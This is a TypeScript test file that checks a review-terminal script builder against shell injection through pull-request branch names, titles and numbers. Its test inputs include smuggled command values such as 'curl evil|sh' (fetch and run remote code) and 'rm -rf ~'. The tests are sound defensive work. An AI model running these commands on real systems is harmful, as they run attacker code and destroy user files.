import { describe, expect, test } from "bun:test";
import { buildReviewTerminalScript, shellQuote, terminalScriptFileName } from "../src/terminal-launch";
import type { WatchItem } from "../src/types";

function prItem(overrides: Partial<WatchItem> = {}): WatchItem {
  return {
    id: "acme/api#42:pr_review_request",
    kind: "pr_review_request",
    lifecycle: "new",
    repo: "acme/api",
    repoName: "api",
    number: 42,
    title: "Add retry",
    actor: "octo",
    url: "https://ghe.example.com/acme/api/pull/42",
    createdAt: "2026-06-01T09:00:00Z",
    updatedAt: "2026-06-01T10:00:00Z",
    firstSeenAt: "",
    lastSeenAt: "",
    isDraft: false,
    labels: [],
    summary: "Add retry.",
    localPath: "/Users/dev/work/api",
    headBranch: "feature/retry",
    baseBranch: "main",
    ...overrides,
  };
}

describe("buildReviewTerminalScript", () => {
  test("checks out a safe branch and guards a dirty working tree", () => {
    const script = buildReviewTerminalScript(prItem());
    expect(script).toContain("cd '/Users/dev/work/api'");
    expect(script).toContain("git status --porcelain");
    expect(script).toContain("git checkout feature/retry");
    expect(script).toContain("set -e");
    expect(script).toContain("exec zsh");
  });

  test("never inlines unsafe author-controlled refs; falls back to the PR number", () => {
    const script = buildReviewTerminalScript(prItem({ headBranch: "x$(curl evil|sh)", baseBranch: "y; rm -rf ~" }));
    expect(script).not.toContain("curl evil");
    expect(script).not.toContain("rm -rf ~");
    expect(script).toContain("git fetch origin pull/42/head:pr-42");
    expect(script).toContain("git checkout main");
  });

  test("shell-quotes free text like titles so quotes cannot escape", () => {
    const script = buildReviewTerminalScript(prItem({ title: "don't'; touch /tmp/pwned; '" }));
    expect(script).not.toContain("; touch /tmp/pwned; '\n");
    // The single-quote escaping keeps the payload inside the quoted echo arg.
    expect(script).toContain(shellQuote("acme/api #42: don't'; touch /tmp/pwned; '"));
  });

  test("refuses non-PR items and items without a local checkout", () => {
    expect(() => buildReviewTerminalScript(prItem({ kind: "issue_assigned" }))).toThrow();
    expect(() => buildReviewTerminalScript(prItem({ localPath: undefined }))).toThrow();
  });

  test("refuses a non-integer PR number that could break out of the script", () => {
    // number is typed as a number, but it round-trips through untrusted JSON
    // (snapshot.json / github-cache.json) that is parsed and cast blindly.
    expect(() => buildReviewTerminalScript(prItem({ number: "1; curl evil|sh #" as unknown as number }))).toThrow();
    expect(() => buildReviewTerminalScript(prItem({ number: -1 }))).toThrow();
    expect(() => buildReviewTerminalScript(prItem({ number: 1.5 }))).toThrow();
  });
});

describe("terminalScriptFileName", () => {
  test("builds a filesystem-safe .command name", () => {
    expect(terminalScriptFileName(prItem())).toBe("review-api-42.command");
    expect(terminalScriptFileName(prItem({ repoName: "weird repo/name" }))).toBe("review-weird-repo-name-42.command");
  });
});
